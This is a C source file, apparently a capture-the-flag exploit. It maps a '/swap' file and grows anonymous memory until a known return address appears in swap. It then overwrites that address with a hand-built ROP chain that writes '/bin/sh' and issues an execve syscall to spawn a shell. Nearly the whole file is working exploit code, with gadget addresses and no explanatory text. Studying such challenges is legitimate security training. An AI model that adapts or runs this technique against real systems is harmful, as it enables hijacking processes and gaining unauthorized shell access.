#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <inttypes.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
void hexdump(unsigned char* buf, size_t size) {
    int i,j;
    for (i = 0;i < size;i += 16)
    {
        printf("%08x:", i);
        for (j = i;j < size && j < i + 16;j++)
        {
            printf(" %02x", buf[j]);
        }
        puts("");
    }
}
int main(int argc, char *argv[])
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    int swap = open("/swap", O_RDWR);
    if (swap < 0) {
        perror("open");
    }
    char *swap_mapped = mmap(0, 10 * 1024 * 1024, PROT_READ|PROT_WRITE, MAP_SHARED, swap, 0);
    printf("%" PRIx64 "\n", swap_mapped);

    size_t i = 100 * 1024 * 1024;
    char *p = (char *)mmap(0, i, 7, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    while (p == -1) {
        i -= 1024 * 1024;
        p = (char *)mmap(0, i, 7, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    }
    printf("%" PRIu64 "\n", i);
    printf("%" PRIx64 "\n", p);

    memset(p, 0, 40 * 1024 * 1024);

    size_t j = 0;
    char *addr = NULL;
    for (;;) {
        memset(p+40*1024*1024+j, 0, 1024 * 1024);
        unsigned long ret = 0x4AE21A;
        addr = memmem(swap_mapped, 10 * 1024 * 1024, (char *)&ret, 8);
        if (addr) {
            printf("%" PRIu64 "\n", j);
            printf("%" PRIx64 "\n", addr);
            hexdump(addr, 0x200);
            break;
        }
        j += 1024 * 1024;
    }
    uint64_t *eq = (uint64_t *)addr;
    *eq++ = 0x00000000004050d8;
    *eq++ = 0x0000000000704000;
    *eq++ = 0x000000000040012b;
    memcpy(eq, "/bin/sh\0", 8);eq++;
    *eq++ = 0x0000000000455e6d;

    *eq++ = 0x00000000004050d8;
    *eq++ = 0x0000000000704008;
    *eq++ = 0x40012B;
    *eq++ = 0x704000;
    *eq++ = 0x0000000000455e6d;

    *eq++ = 0x00000000004050d8;
    *eq++ = 0x0000000000704010;
    *eq++ = 0x40012B;
    *eq++ = 0;
    *eq++ = 0x0000000000455e6d;

    *eq++ = 0x000000000040045b;
    *eq++ = 0x0000000000704000; // rsi
    *eq++ = 0x0000000000405a7a;
    *eq++ = 0x0000000000704008; // rdi
    *eq++ = 0x00000000004050d8;
    *eq++ = 0; // rdx
    *eq++ = 0x40012B; // pop rax
    *eq++ = 0x3b; // execve
    *eq++ = 0x00000000004003f3; // syscall

    if (munmap(p, i) < 0)
        perror("munmap");
    if (msync(swap_mapped, 10*1024*1024, MS_SYNC) < 0)
        perror("msync");
    if (munmap(swap_mapped, 10*1024*1024) < 0)
        perror("munmap2");
    return 0;
}
